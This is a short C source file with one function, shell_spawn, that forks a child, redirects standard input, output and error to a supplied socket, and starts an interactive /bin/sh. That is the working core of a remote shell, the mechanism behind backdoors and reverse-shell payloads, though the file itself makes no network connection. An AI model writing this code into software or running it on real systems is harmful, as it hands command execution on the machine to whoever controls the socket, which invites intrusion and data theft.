#include "shell.h"
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>

int shell_spawn(shell_sock_t s) {
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        dup2(s, 0); dup2(s, 1); dup2(s, 2);
        if (s > 2) close(s);
        execl("/bin/sh", "sh", "-i", NULL);
        _exit(127);
    }
    int status;
    waitpid(pid, &status, 0);
    return 0;
}

int shell_wait(void) { return 0; }